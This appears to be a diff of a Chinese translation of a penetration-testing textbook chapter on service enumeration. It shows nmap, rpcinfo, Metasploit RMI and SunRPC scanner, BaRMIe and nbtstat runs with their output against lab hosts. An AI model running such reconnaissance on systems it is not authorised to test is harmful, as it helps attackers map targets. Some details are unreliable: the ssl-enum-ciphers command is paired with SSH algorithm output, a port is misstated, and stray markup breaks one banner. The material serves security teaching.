-SNMP 可以提供大量系统信息。如果你能够获得 SNMP 系统的访问权限，就能遍历管理信息基（MIB），从目标系统中提取详细信息。有工具会帮助你完成此遍历，获取信息并将其呈现给你。  
-
-MITRE ATT&CK 框架将列举归类为侦察（Reconnaissance）阶段。目前，它识别了两种技术：Gather Victim Host Information（收集目标主机信息）和 Gather Victim Identity Information（收集目标身份信息），这两种技术广泛符合列举的范畴。  
-
-
-
--   [服务是必要的，因为它们是工作完成的方式。例如，你无法在没有某个邮件服务器的情况下发送电子邮件，该服务器用于接收消息。攻击者正是利用这一点。那些可能存在漏洞或被用于利用的服务，保证了有一个可以远程访问的应用程序。这并不意味着服务无法防止枚举。这些反测量措施是帮助确保合法用户正在访问或探测服务以获取信息的方法。
+- 服务是必要的，因为它们是工作完成的方式。例如，你无法在没有某个邮件服务器的情况下发送电子邮件，该服务器用于接收消息。攻击者正是利用这一点。那些可能存在漏洞或被用于利用的服务，保证了有一个可以远程访问的应用程序。这并不意味着服务无法防止枚举。这些反测量措施是帮助确保合法用户正在访问或探测服务以获取信息的方法。
 
 到本章结束时，你应该对枚举的概念有扎实的理解，以及可以用来枚举系统中不同资源的工具。其中很多工具是基于 Linux 的，并运行在命令行中，但我们也会查看一些 Windows 工具。
 
-## 服务枚举
+### 服务枚举
 
 当你扫描系统时，`nmap` 始终是你的朋友。这同样适用于服务枚举。这意味着你正在识别目标系统上运行的服务。快速实现这一点的方法是使用 `nmap` 内置的版本扫描功能。在下面的代码片段中，你可以看到一段来自在我的网络中运行 `nmap` 版本扫描的输出结果。版本扫描是通过将 `‑sV` 参数发送到 `nmap` 来执行的。它不仅显示打开的端口，还显示这些端口的位置以及运行在被发现的网络主机上的服务及其版本的具体信息。它通过查看任何应用程序横幅来提取服务名称和版本的详细信息。
 
@@ -4942,36 +5387,54 @@ MITRE ATT&CK 框架将列举归类为侦察（Reconnaissance）阶段。目前�
 
 ```
 $ sudo nmap -sV 192.168.1.15
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 13:44 EST
-  
+
 PORT    STATE  SERVICE VERSION
+
 22/tcp  open   ssh     OpenSSH 7.7p1 Debian 3 (protocol 2.0)
+
 25/tcp  closed smtp
+
 80/tcp  open   http    Greenbone Security Assistant
+
 443/tcp closed https
+
 MAC Address: 0E:76:03:B8:2A:BA (Unknown)
+
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-  
+
 Nmap scan report for desktop-3rgc5h2.lan (192.168.86.60)
+
 Host is up (0.025s latency).
-  
+
 PORT    STATE    SERVICE VERSION
+
 22/tcp  filtered ssh
+
 25/tcp  filtered smtp
+
 80/tcp  filtered http
+
 443/tcp filtered https
+
 MAC Address: C4:9D:ED:AB:DD:7A (Microsoft)
-  
+
 Nmap scan report for milobloom.lan (192.168.86.61)
+
 Host is up (0.94s latency).
-  
+
 PORT    STATE  SERVICE VERSION
+
 22/tcp  open   ssh     OpenSSH 7.6 (protocol 2.0)
+
 25/tcp  closed smtp
+
 80/tcp  closed http
+
 443/tcp closed https
+
 MAC Address: B8:09:8A:C7:13:8F (Apple)
- 
 ```
 
 如你所见，并非所有服务都会提供关于它们的详细信息。我们可以识别服务，但在大多数情况下无法确定其应用程序或版本。在前面的列表中，我们可以看到一小部分系统正在运行安全外壳（SSH）。并非所有的 SSH 服务器都提供版本或甚至协议。幸运的是，我们可以再次使用 `nmap` 获取关于 SSH 的更多详细信息。`nmap` 具有脚本功能，并且有很多脚本可以用于枚举服务以获取更多细节。其中之一是用于枚举 SSH 服务器支持的算法的脚本，即 `ssl‑enum‑ciphers.nse`。
@@ -4980,55 +5443,102 @@ MAC Address: B8:09:8A:C7:13:8F (Apple)
 
 ```
 $ sudo nmap --script=ssl-enum-ciphers 192.168.1.15
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 13:46 EST
+
 Nmap scan report for 192.168.1.15
+
 Host is up (0.073s latency).
+
 Not shown: 997 closed tcp ports (reset)
-  
+
 PORT   STATE SERVICE
+
 22/tcp open  ssh
+
 | ssh2-enum-algos:
+
 |   kex_algorithms: (10)
+
 |       curve25519-sha256
+
 |       curve25519-sha256@libssh.org
+
 |       ecdh-sha2-nistp256
+
 |       ecdh-sha2-nistp384
+
 |       ecdh-sha2-nistp521
+
 |       diffie-hellman-group-exchange-sha256
+
 |       diffie-hellman-group16-sha512
+
 |       diffie-hellman-group18-sha512
+
 |       diffie-hellman-group14-sha256
+
 |       diffie-hellman-group14-sha1
+
 |   server_host_key_algorithms: (5)
+
 |       ssh-rsa
+
 |       rsa-sha2-512
+
 |       rsa-sha2-256
+
 |       ecdsa-sha2-nistp256
+
 |       ssh-ed25519
+
 |   encryption_algorithms: (6)
+
 |       chacha20-poly1305@openssh.com
+
 |       aes128-ctr
+
 |       aes192-ctr
+
 |       aes256-ctr
+
 |       aes128-gcm@openssh.com
+
 |       aes256-gcm@openssh.com
+
 |   mac_algorithms: (10)
+
 |       umac-64-etm@openssh.com
+
 |       umac-128-etm@openssh.com
+
 |       hmac-sha2-256-etm@openssh.com
+
 |       hmac-sha2-512-etm@openssh.com
+
 |       hmac-sha1-etm@openssh.com
+
 |       umac-64@openssh.com
+
 |       umac-128@openssh.com
+
 |       hmac-sha2-256
+
 |       hmac-sha2-512
+
 |       hmac-sha1
+
 |   compression_algorithms: (2)
+
 |       none
+
 |_      zlib@openssh.com
+
 MAC Address: 0E:76:03:B8:2A:BA (Unknown)
- 
 ```
+
+
+
 
 在输出中，你会看到一系列算法类型。第一组算法是用于密钥交换。其中之一是 Diffie‑Hellman 算法，以 Whitfield Diffie 和 Martin Hellman 之名，他们最先发表了用于密钥交换的算法。密钥交换算法很重要，因为密钥是加密的关键，并且在建立连接时生成。你还可以看到加密算法的列表。大多数是高级加密标准（AES），但你会注意到还有一个名为 ChaCha20 的算法。它是一种流 cipher，类似于 AES，可以让程序在不需要开源加密库的情况下使用加密。最后，还有消息认证码（MAC），用于确保消息没有被篡改或损坏。
 
@@ -5038,19 +5548,17 @@ MAC Address: 0E:76:03:B8:2A:BA (Unknown)
 
 每个服务都有不同的配置设置，可以防止攻击者进行枚举，但从高层面来看，下面的反测量措施应为每个服务考虑：
 
-*   **防火墙**   网络防火墙和主机防火墙都可以用于保护服务，通过阻止不应发送请求的系统发送请求。
+*   **防火墙** 网络防火墙和主机防火墙都可以用于保护服务，通过阻止不应发送请求的系统发送请求。
 
-*   **身份验证**   强身份验证可以帮助保护某些服务，因为身份验证可能在请求可以发送到服务之前就已经完成。
+*   **身份验证** 强身份验证可以帮助保护某些服务，因为身份验证可能在请求可以发送到服务之前就已经完成。
 
-*   **减少提供的信息**   某些服务允许你配置在握手时提供多少信息——即服务在收到连接请求时向用户问候的信息。
+*   **减少提供的信息** 某些服务允许你配置在握手时提供多少信息——即服务在收到连接请求时向用户问候的信息。
 
 ## 远程过程调用
 
 远程过程调用（RPC）是一种服务，它允许远程系统消费该应用程序之外的过程。系统 A 上的程序可以调用另一个系统上的函数或过程。它通过 RPC 协议实现。对本地计算机上的程序而言，调用远程过程就像调用本地过程一样，它存在于同一进程空间中。程序调用该过程，获取信息，然后继续前进。RPC 为两个进程之间的通信提供了方式。*Remote* 通常指远程服务器，但两个本地进程也可以使用 RPC 进行通信。
 
 ### SunRPC
-
-
 
 -   [进程间通信](https://example.org/interprocess_communication)已经存在数十年。几十年来出现了多种请求-响应协议的实现。Java 的远程方法调用（RMI）是最近的一个例子。在此之前，还有独立于语言实现的通用对象请求框架（CORBA）。有时，使用 RPC 时，你需要本质上是一个目录服务，用于指示不同服务在动态端口上运行的端口。
 
@@ -5062,31 +5570,55 @@ MAC Address: 0E:76:03:B8:2A:BA (Unknown)
 
 ```
 kilroy@bobbie $ rpcinfo -p 192.168.86.52
+
     program vers proto   port  service
+
      100000    4   tcp    111  portmapper
+
      100000    3   tcp    111  portmapper
+
      100000    2   tcp    111  portmapper
+
      100000    4   udp    111  portmapper
+
      100000    3   udp    111  portmapper
+
      100000    2   udp    111  portmapper
+
      100005    1   udp  43939  mountd
+
      100005    1   tcp  58801  mountd
+
      100005    2   udp  46384  mountd
+
      100005    2   tcp  50405  mountd
+
      100005    3   udp  49030  mountd
+
      100005    3   tcp  50553  mountd
+
      100003    3   tcp   2049  nfs
+
      100003    4   tcp   2049  nfs
+
      100227    3   tcp   2049  nfs_acl
+
      100003    3   udp   2049  nfs
+
      100227    3   udp   2049  nfs_acl
+
      100021    1   udp  34578  nlockmgr
+
      100021    3   udp  34578  nlockmgr
+
      100021    4   udp  34578  nlockmgr
+
      100021    1   tcp  39297  nlockmgr
+
      100021    3   tcp  39297  nlockmgr
+
      100021    4   tcp  39297  nlockmgr
- 
+
 ```
 
 -   前面提到的程序若已在 `rpcbind` 中注册了远程过程，则与 NFS 文件共享服务器关联。`portmapper` 是主要查询的服务，而 `mountd`、`nfs`、`nlockmgr` 等则是 NFS 所必需的组件。NFS 由 Sun Microsystems 开发，`portmapper` 是 Sun 关联的 RPC 实现，有时也称为 sunrpc。例如 Metasploit 中的扫描器可以利用 sunrpc 来识别端口映射器分配的程序端口。
@@ -5094,44 +5626,72 @@ kilroy@bobbie $ rpcinfo -p 192.168.86.52
 #### Metasploit sunrpc 扫描器
 
 ```
- msf> use auxiliary/scanner/misc/sunrpc_portmapper
-  
- msf auxiliary(scanner/misc/sunrpc_portmapper)> set RHOSTS 192.168.86.52
- RHOSTS => 192.168.86.52
- msf auxiliary(scanner/misc/sunrpc_portmapper)> run
-  
- [+] 192.168.86.52:111 - SunRPC Programs for 192.168.86.52
- =================================
-  
- Name      Number  Version  Port   Protocol
- ----      ------  -------  ----   --------
- mountd    100005  1        43939  udp
- mountd    100005  1        58801  tcp
- mountd    100005  2        46384  udp
- mountd    100005  2        50405  tcp
- mountd    100005  3        49030  udp
- mountd    100005  3        50553  tcp
- nfs       100003  3        2049   tcp
- nfs       100003  4        2049   tcp
- nfs       100003  3        2049   udp
- nfs_acl   100227  3        2049   tcp
- nfs_acl   100227  3        2049   udp
- nlockmgr  100021  1        34578  udp
- nlockmgr  100021  3        34578  udp
- nlockmgr  100021  4        34578  udp
- nlockmgr  100021  1        39297  tcp
- nlockmgr  100021  3        39297  tcp
- nlockmgr  100021  4        39297  tcp
- rpcbind   100000  4        111    tcp
- rpcbind   100000  3        111    tcp
- rpcbind   100000  2        111    tcp
- rpcbind   100000  4        111    udp
- rpcbind   100000  3        111    udp
- rpcbind   100000  2        111    udp
-  
- [*] Scanned 1 of 1 hosts (100% complete)
- [*] Auxiliary module execution completed
- 
+msf> use auxiliary/scanner/misc/sunrpc_portmapper
+
+msf auxiliary(scanner/misc/sunrpc_portmapper)> set RHOSTS 192.168.86.52
+
+RHOSTS => 192.168.86.52
+
+msf auxiliary(scanner/misc/sunrpc_portmapper)> run
+
+[+] 192.168.86.52:111 - SunRPC Programs for 192.168.86.52
+
+=================================
+
+Name      Number  Version  Port   Protocol
+
+----      ------  -------  ----   --------
+
+mountd    100005  1        43939  udp
+
+mountd    100005  1        58801  tcp
+
+mountd    100005  2        46384  udp
+
+mountd    100005  2        50405  tcp
+
+mountd    100005  3        49030  udp
+
+mountd    100005  3        50553  tcp
+
+nfs       100003  3        2049   tcp
+
+nfs       100003  4        2049   tcp
+
+nfs       100003  3        2049   udp
+
+nfs_acl   100227  3        2049   tcp
+
+nfs_acl   100227  3        2049   udp
+
+nlockmgr  100021  1        34578  udp
+
+nlockmgr  100021  3        34578  udp
+
+nlockmgr  100021  4        34578  udp
+
+nlockmgr  100021  1        39297  tcp
+
+nlockmgr  100021  3        39297  tcp
+
+nlockmgr  100021  4        39297  tcp
+
+rpcbind   100000  4        111    tcp
+
+rpcbind   100000  3        111    tcp
+
+rpcbind   100000  2        111    tcp
+
+rpcbind   100000  4        111    udp
+
+rpcbind   100000  3        111    udp
+
+rpcbind   100000  2        111    udp
+
+[*] Scanned 1 of 1 hosts (100% complete)
+
+[*] Auxiliary module execution completed
+
 ```
 
 -   由于我们正在扫描同一主机，使用 Metasploit 模块得到的结果与 `rpcinfo` 的结果相同是合理的。所有操作仅是向端口映射器进程查询。你可以使用最舒适的工具进行查询。相较于 `nmap`，这些工具有两个优势：第一，通过查询端口映射器可以得到进程名称；第二，除非你明确指定扫描所有端口，否则 `nmap` 会返回所有端口，而 `portmap` 分配的端口范围并不在 `nmap` 默认扫描列表中。
@@ -5147,28 +5707,37 @@ Java 程序尤其在 Web 应用领域非常流行。Java 为程序员提供了�
 **运行 RMI 扫描器（Metasploit）**
 
 ```
- msf> use auxiliary/gather/java_rmi_registry
- msf auxiliary(gather/java_rmi_registry)> show options
-  
- Module options (auxiliary/gather/java_rmi_registry):
-  
-    Name   Current Setting  Required  Description
-    ----   ---------------  --------  -----------
-    RHOST                   yes       The target address
-    RPORT  1099             yes       The target port (TCP)
-  
- msf auxiliary(gather/java_rmi_registry)> set RHOST 192.168.86.62
- RHOST => 192.168.86.62
- msf auxiliary(gather/java_rmi_registry)> run
-  
- [*] 192.168.86.62:1099 - Sending RMI Header…
- [*] 192.168.86.62:1099 - Listing names in the Registry…
- [+] 192.168.86.62:1099 - 1 names found in the Registry
- [+] 192.168.86.62:1099 - Name HelloServer (HelloImpl_Stub) found on 127.0.1.1:38371
- [*] Auxiliary module execution completed
- 
+msf> use auxiliary/gather/java_rmi_registry
 
+msf auxiliary(gather/java_rmi_registry)> show options
 
+Module options (auxiliary/gather/java_rmi_registry):
+
+   Name   Current Setting  Required  Description
+
+   ----   ---------------  --------  -----------
+
+   RHOST                   yes       The target address
+
+   RPORT  1099             yes       The target port (TCP)
+
+msf auxiliary(gather/java_rmi_registry)> set RHOST 192.168.86.62
+
+RHOST => 192.168.86.62
+
+msf auxiliary(gather/java_rmi_registry)> run
+
+[*] 192.168.86.62:1099 - Sending RMI Header…
+
+[*] 192.168.86.62:1099 - Listing names in the Registry…
+
+[+] 192.168.86.62:1099 - 1 names found in the Registry
+
+[+] 192.168.86.62:1099 - Name HelloServer (HelloImpl_Stub) found on 127.0.1.1:38371
+
+[*] Auxiliary module execution completed
+
+```
 
 -   [运行 `java_rmi_registry` 模块所需的选项很简单。远程端口默认是 1099，这是 `rmiregistry` 监听的端口。如果你认为有其他端口在监听，可以设置 `RPORT` 变量。不过，必需的变量是 `RHOST`。我们将该变量设置为实现了简单 Java RMI 服务器的系统的 IP 地址。你可以看到扫描的结果。根据 RMI 注册表，有一个名为 `HelloServer` 的服务器。它甚至告诉我们，桩的名字是 `HelloImpl`。虽然它是服务器，但注册表称之为桩，因为桩和桩的区别在于对话的结束。`rmic` 为服务器和客户端生成桩。只是把服务器端称为桩可以区分两者。
 
@@ -5178,271 +5747,382 @@ Metasploit 并不是唯一可以扫描 RMI 服务的方法。如果你稍微查�
 root@quiche:~# java -jar BaRMIe_v1.01.jar  192.168.86.62
 ```
 
-  
-
   |</line><line xml:id="c06-line-0158"><![CDATA[ |
 
    |    |   |
+
                                                       v1.0
+
                       Java RMI enumeration tool.
+
                         Written by Nicky Bloor (@NickstaDB)
-  
+
  Warning: BaRMIe was written to aid security professionals in identifying the
+
           insecure use of RMI services on systems which the user has prior
+
           permission to attack. BaRMIe must be used in accordance with all
+
           relevant laws. Failure to do so could lead to your prosecution.
+
           The developers assume no liability and are not responsible for any
+
           misuse or damage caused by this program.
-  
+
  Scanning 1 target(s) for objects exposed via an RMI registry…
 
  [-] An exception occurred during the PassThroughProxyThread main loop.
+
      java.net.SocketException: Socket closed
+
  [-] An exception occurred during the ReplyDataCapturingProxyThread main loop.
+
      java.net.SocketException: Socket closed
+
  RMI Registry at 192.168.86.62:1099
+
  Objects exposed: 1
+
  Object 1
+
    Name: HelloServer
+
    Endpoint: 127.0.1.1:38371
+
    [+] Object is bound to localhost, but appears to be exposed remotely.
+
    Classes: 3
+
      Class 1
+
        Classname: java.rmi.server.RemoteStub
+
      Class 2
+
        Classname: java.rmi.server.RemoteObject
+
      Class 3
+
        Classname: HelloImpl_Stub
-  
+
  1 potential attacks identified (+++ = more reliable)
+
  [---] Java RMI registry illegal bind deserialization
-  
+
  0 deserialization gadgets found on leaked CLASSPATH
- [~] Gadgets may still be present despite CLASSPATH not being leaked
-  
- Successfully scanned 1 target(s) for objects exposed via RMI.
- 
-```
 
-我们从运行这个程序中看到几个要点。它比 Metasploit 更详细。我们得到了服务器的名称，`HelloServer`。正如与 Metasploit 类似的情况，我们看到服务器绑定在本地主机的 38371 端口，这是 `rmiregistry` 动态分配的端口。我们还可以看到类的继承树。我们可以看到引用 `java.rmi.server.RemoteStub`、`java.rmi.server.RemoteObject` 和 `HelloImpl.Stub` 类。根据 BaRMIe，该服务在远程公开但仅限于本地。这意味着我们存在信息泄露。为了尝试识别该 RMI 服务的漏洞并潜在利用这些漏洞，我们需要获得系统访问权限。
 
-在识别 RMI 注册表和额外服务的同时，我们还发现目标系统上存在另一个软件。这可能显而易见，但如果你发现 RMI 注册表和 RMI 服务，你就已经找到了至少有一个 Java 运行时环境（JRE）或 Java 开发工具包（JDK）的系统。这里并没有透露 JRE 或 JDK 的版本。然而，近年来 Java 实现中出现了许多漏洞。知道系统上至少有一个 JRE 可能为你提供了漏洞线索。
+
+
+[~] `Gadgets` may still be present despite `CLASSPATH` not being leaked
+
+Successfully scanned `1` target(s) for objects exposed via `RMI`.
+
+我们从运行这个程序中看到几个要点。它比 `Metasploit` 更详细。我们得到了服务器的名称，`HelloServer`。正如与 `Metasploit` 类似的情况，我们看到服务器绑定在本地主机的 `38371` 端口，这是 `rmiregistry` 动态分配的端口。我们还可以看到类的继承树。我们可以看到引用 `java.rmi.server.RemoteStub`、`java.rmi.server.RemoteObject` 和 `HelloImpl.Stub` 类。根据 `BaRMIe`，该服务在远程公开但仅限于本地。这意味着我们存在信息泄露。为了尝试识别该 `RMI` 服务的漏洞并潜在利用这些漏洞，我们需要获得系统访问权限。
+
+在识别 `RMI` 注册表和额外服务的同时，我们还发现目标系统上存在另一个软件。这可能显而易见，但如果你发现 `RMI` 注册表和 `RMI` 服务，你就已经找到了至少有一个 Java 运行时环境（`JRE`）或 Java 开发工具包（`JDK`）的系统。这里并没有透露 `JRE` 或 `JDK` 的版本。然而，近年来 Java 实现中出现了许多漏洞。知道系统上至少有一个 `JRE` 可能为你提供了漏洞线索。
 
 ## Server Message Block
 
-你在 Windows 网络中最常见的远程过程调用实现就是 Server Message Block（SMB）。SMB 协议在考虑其所有使用方式和运作方式时相当复杂。你可能最熟悉的是 SMB 用于在网络中共享文件。虽然这确实是 SMB 的一个用途，但它并非唯一，甚至在文件共享方面也远不止是传输文件内容。
+你在 Windows 网络中最常见的远程过程调用实现就是 Server Message Block（`SMB`）。`SMB` 协议在考虑其所有使用方式和运作方式时相当复杂。你可能最熟悉的是 `SMB` 用于在网络中共享文件。虽然这确实是 `SMB` 的一个用途，但它并非唯一，甚至在文件共享方面也远不止是传输文件内容。
 
-SMB 是一个应用层协议，可以在不同的低层协议之上运行。首先，它可以直接在 TCP 上运行，而无需其他会话层协议。如果系统直接在 TCP 上运行 SMB，你会发现 TCP 端口 445 打开。SMB 也可以在像 NetBIOS 这样的会话协议上运行，NetBIOS 是 IBM 开发的应用编程接口（API），用于将输入/输出（I/O）能力从本地系统扩展到网络。如果你看到 UDP 端口 137 和 138 打开，你就知道 SMB 运行在 NetBIOS 之上。但如果你看到 TCP 端口 137 和 139 打开，你就发现 SMB 运行在 NetBIOS over TCP 之上。请记住，这里的 NetBIOS 用于名称服务。
+`SMB` 是一个应用层协议，可以在不同的低层协议之上运行。首先，它可以直接在 `TCP` 上运行，而无需其他会话层协议。如果系统直接在 `TCP` 上运行 `SMB`，你会发现 `TCP` 端口 `445` 打开。`SMB` 也可以在像 `NetBIOS` 这样的会话协议上运行，`NetBIOS` 是 `IBM` 开发的应用编程接口（`API`），用于将输入/输出（`I/O`）能力从本地系统扩展到网络。如果你看到 `UDP` 端口 `137` 和 `138` 打开，你就知道 `SMB` 运行在 `NetBIOS` 之上。但如果你看到 `TCP` 端口 `137` 和 `139` 打开，你就发现 `SMB` 运行在 `NetBIOS over TCP` 之上。请记住，这里的 `NetBIOS` 用于名称服务。
 
-那么，SMB 到底有什么用途？SMB 用于在 Windows 系统之间进行通信——文件共享、网络管理、系统管理。这可能包括确保系统命名避免冲突。管理工作需要系统向本地网络广播自己，以防止冲突。SMB 还必须支持身份验证，以防止系统对整个网络敞开。这意味着 SMB 了解用户和组。它还知道共享，即向网络公开的目录。系统必须能够向询问的系统提供它们正在导出的共享列表。这使用户可以查看可用的共享，然后在认证后访问想要的共享。
+那么，`SMB` 到底有什么用途？`SMB` 用于在 Windows 系统之间进行通信——文件共享、网络管理、系统管理。这可能包括确保系统命名避免冲突。管理工作需要系统向本地网络广播自己，以防止冲突。`SMB` 还必须支持身份验证，以防止系统对整个网络敞开。这意味着 `SMB` 了解用户和组。它还知道共享，即向网络公开的目录。系统必须能够向询问的系统提供它们正在导出的共享列表。这使用户可以查看可用的共享，然后在认证后访问想要的共享。
 
-身份验证并不总是必要的。SMB 支持所谓的 *null authentication*（空认证）。这意味着某些函数不需要用户名和密码。系统可以使用空认证请求网络上另一系统的信息，即没有传递凭据。空认证可以让我们在不提供凭据的情况下获取大量系统信息。
+身份验证并不总是必要的。`SMB` 支持所谓的 `null authentication`（空认证）。这意味着某些函数不需要用户名和密码。系统可以使用空认证请求网络上另一系统的信息，即没有传递凭据。空认证可以让我们在不提供凭据的情况下获取大量系统信息。
 
-我们可以使用多种工具来枚举 Windows 系统的信息。实际上，这不仅限于 Windows 系统，尽管在其他系统上实现 SMB 的目的是为了与 Windows 系统互操作。Samba 是一个可以在类 Unix 操作系统上安装的包，它提供 SMB 以及 NetBIOS 命名服务。Samba 有两个独立的进程：一个是 smbd，负责 SMB；另一个是 nmbd，负责名称方面的互操作。这意味着即使我们是为了枚举 Windows 系统而查找信息，也可以同时获取类 Unix 系统的信息。
+我们可以使用多种工具来枚举 Windows 系统的信息。实际上，这不仅限于 Windows 系统，尽管在其他系统上实现 `SMB` 的目的是为了与 Windows 系统互操作。`Samba` 是一个可以在类 Unix 操作系统上安装的包，它提供 `SMB` 以及 `NetBIOS` 命名服务。`Samba` 有两个独立的进程：一个是 `smbd`，负责 `SMB`；另一个是 `nmbd`，负责名称方面的互操作。这意味着即使我们是为了枚举 Windows 系统而查找信息，也可以同时获取类 Unix 系统的信息。
 
-
-
-
--   [使用内置工具开始](https://example.org)是首要步骤。内置工具在 Windows 系统上特别可用，但也有类 Unix 工具。我们还将查看若干为 `nmap` 提供的插件，用于收集信息。Metasploit 不意外地拥有若干用于扫描 SMB 系统的模块。此外还有其他实用工具可用，我们将进一步介绍其中一些。
+- [使用内置工具开始](https://example.org)是首要步骤。内置工具在 Windows 系统上特别可用，但也有类 Unix 工具。我们还将查看若干为 `nmap` 提供的插件，用于收集信息。`Metasploit` 不意外地拥有若干用于扫描 `SMB` 系统的模块。此外还有其他实用工具可用，我们将进一步介绍其中一些。
 
 ### 内置工具
 
-如果你在 Windows 系统上，有若干实用工具可用于通过 SMB 收集信息，Linux 也有相应的对应工具。需要注意的是，使用内置工具时必须处于同一广播域内。NetBIOS 最初是为局域网（LAN）设计的，而非面向广域网（WAN）的概念。因此，部分功能之所以能工作，是因为系统依赖于向网络广播信息。这意味着在使用这些工具之前，你必须先在本地网络中存在。
+如果你在 Windows 系统上，有若干实用工具可用于通过 `SMB` 收集信息，`Linux` 也有相应的对应工具。需要注意的是，使用内置工具时必须处于同一广播域内。`NetBIOS` 最初是为局域网（`LAN`）设计的，而非面向广域网（`WAN`）的概念。因此，部分功能之所以能工作，是因为系统依赖于向网络广播信息。这意味着在使用这些工具之前，你必须先在本地网络中存在。
 
-通过 `nbtstat` 可以获取 NetBIOS 统计信息，从而获取本地网络的相关数据。下面的示例展示了使用 `nbtstat` 获取远程系统信息的方式。使用 `nbtstat -a` 可以查看提供的主机名的名称表。如果仅知道远程系统的 IP 地址，则可以使用 `nbtstat -A`。输出会在左侧列出名称列表，随后是一个代码。该代码指示名称所属的上下文，并显示每个名称的状态。
+通过 `nbtstat` 可以获取 `NetBIOS` 统计信息，从而获取本地网络的相关数据。下面的示例展示了使用 `nbtstat` 获取远程系统信息的方式。使用 `nbtstat -a` 可以查看提供的主机名的名称表。如果仅知道远程系统的 `IP` 地址，则可以使用 `nbtstat -A`。输出会在左侧列出名称列表，随后是一个代码。该代码指示名称所属的上下文，并显示每个名称的状态。
 
-**nbtstat 输出**
+#### nbtstat 输出
 
 ```
 C:\Users\kilroy> nbtstat -a billthecat
 
 Local Area Connection:
+
 Node IpAddress: [192.168.86.50] Scope Id: []
 
            NetBIOS Remote Machine Name Table
 
         Name               Type         Status
+
      ---------------------------------------------
+
      BILLTHECAT     <00>  UNIQUE      Registered
+
      BILLTHECAT     <20>  UNIQUE      Registered
+
      WORKGROUP      <00>  GROUP       Registered
 
-     MAC Address = AC-87-A3-36-D6-AA                    
-
+     MAC Address = AC-87-A3-36-D6-AA                     
 ```
 
-显示的代码来自 NetBIOS，可查询其含义以确定名称所属的上下文。使用 SMB 的系统可以在多种上下文中存在。这里所示的系统既是工作站，也是文件服务器，这意味着已启用文件共享。此外，该系统在网络中还充当工作站或客户端。区分这些功能很重要，因为每个系统只能询问其支持的操作类型。技术上说，每一组功能都关联有特定的过程。在对远程系统调用过程发起操作之前，必须先知道该系统提供哪些过程。`nbtstat -a` 本质上提供了这些信息。
+显示的代码来自 `NetBIOS`，可查询其含义以确定名称所属的上下文。使用 `SMB` 的系统可以在多种上下文中存在。这里所示的系统既是工作站，也是文件服务器，这意味着已启用文件共享。此外，该系统在网络中还充当工作站或客户端。区分这些功能很重要，因为每个系统只能询问其支持的操作类型。技术上说，每一组功能都关联有特定的过程。在对远程系统调用过程发起操作之前，必须先知道该系统提供哪些过程。`nbtstat -a` 本质上提供了这些信息。
 
-目前为止我们仅查询单个主机名在网络上的所有函数（名称）。如果想看到所有通过 SMB/NetBIOS 通信的主机名，需要使用其他参数。仍可使用 `nbtstat`，但需在命令行中传入不同的参数。我们需要查找已解析的名称。该列表可能来源于广播消息（当没有中央名称数据库时，系统在上线时会广播自身名称并定期更新），也可能来源于 Windows Internet Name Server（WINS），它是企业网络中系统名称的中央存储库。Windows 服务器提供 WINS 功能，系统会向 WINS 注册，从而实现所有名称的解析。
+目前为止我们仅查询单个主机名在网络上的所有函数（名称）。如果想看到所有通过 `SMB`/`NetBIOS` 通信的主机名，需要使用其他参数。仍可使用 `nbtstat`，但需在命令行中传入不同的参数。我们需要查找已解析的名称。该列表可能来源于广播消息（当没有中央名称数据库时，系统在上线时会广播自身名称并定期更新），也可能来源于 Windows Internet Name Server（`WINS`），它是企业网络中系统名称的中央存储库。Windows 服务器提供 `WINS` 功能，系统会向 `WINS` 注册，从而实现所有名称的解析。
 
-在下面的代码片段中，你可以看到网络上列出的名称。由于网络中没有 Windows 服务器，也没有 WINS，这些名称均是通过广播发现的。这些系统均为 macOS，但它们通过 SMB 在网络中共享文件。要实现这一点，它们必须像任何其他使用 SMB 的系统一样行为。
+在下面的代码片段中，你可以看到网络上列出的名称。由于网络中没有 Windows 服务器，也没有 `WINS`，这些名称均是通过广播发现的。这些系统均为 `macOS`，但它们通过 `SMB` 在网络中共享文件。要实现这一点，它们必须像任何其他使用 `SMB` 的系统一样行为。
 
-**使用 nbtstat 列出已解析的名称**
+#### 使用 nbtstat 列出已解析的名称
 
 ```
 C:\Users\kilroy
+
 > nbtstat -r
 
          NetBIOS Names Resolution and Registration Statistics
+
          ----------------------------------------------------
-  
+
          Resolved By Broadcast     = 47
+
          Resolved By Name Server   = 0
 
          Registered By Broadcast   = 8
+
          Registered By Name Server = 0
 
          NetBIOS Names Resolved By Broadcast
-         ---------------------------------------------
-                 YAZPISTACHIO   <00>
-                 BILLTHECAT     <00>
-                 YAZPISTACHIO   <00>
-                 YAZPISTACHIO   <00>
-                 LOLAGRANOLA    <00>
-                 LOLAGRANOLA    <00>
-                 YAZPISTACHIO   <00>
-                 YAZPISTACHIO   <00>                
 
+         ---------------------------------------------
+
+                 YAZPISTACHIO   <00>
+
+                 BILLTHECAT     <00>
+
+                 YAZPISTACHIO   <00>
+
+                 YAZPISTACHIO   <00>
+
+                 LOLAGRANOLA    <00>
+
+                 LOLAGRANOLA    <00>
+
+                 YAZPISTACHIO   <00>
+
+                 YAZPISTACHIO   <00>                
 ```
 
-`nbtstat` 还有其他功能，但它们更多与本地系统的功能相关，与枚举关系不大。虽然 `nbtstat` 功能丰富，但如前所述，它仅在 Windows 系统上可用。如果你使用的是 Linux 系统，且已安装 Samba 包（提供 SMB 通信能力），则可以使用 `nmblookup` 进行名称查询。该工具可用于查询 WINS 以及通过广播获取的名称。例如，要获取我们之前对 `billthecat` 的详细信息，可使用 `nmblookup -S -B billthecat`，如下所示。
+`nbtstat` 还有其他功能，但它们更多与本地系统的功能相关，与枚举关系不大。虽然 `nbtstat` 功能丰富，但如前所述，它仅在 Windows 系统上可用。如果你使用的是 `Linux` 系统，且已安装 `Samba` 包（提供 `SMB` 通信能力），则可以使用 `nmblookup` 进行名称查询。该工具可用于查询 `WINS` 以及通过广播获取的名称。例如，要获取我们之前对 `billthecat` 的详细信息，可使用 `nmblookup -S -B billthecat`，如下所示。
 
-**nmblookup 用于枚举**
+#### nmblookup 用于枚举
 
 ```
 kilroy@savagewood$ nmblookup -S -B 192.168.86.255 billthecat
+
  Can't load /etc/samba/smb.conf - run testparm to debug it
+
  querying billthecat on 192.168.86.255
+
  192.168.86.32 billthecat<00>
+
  Looking up status of 192.168.86.32
+
       BILLTHECAT      <00> -         H <ACTIVE>
+
       BILLTHECAT      <20> -         H <ACTIVE>
+
       WORKGROUP       <00> - <GROUP> H <ACTIVE>
 
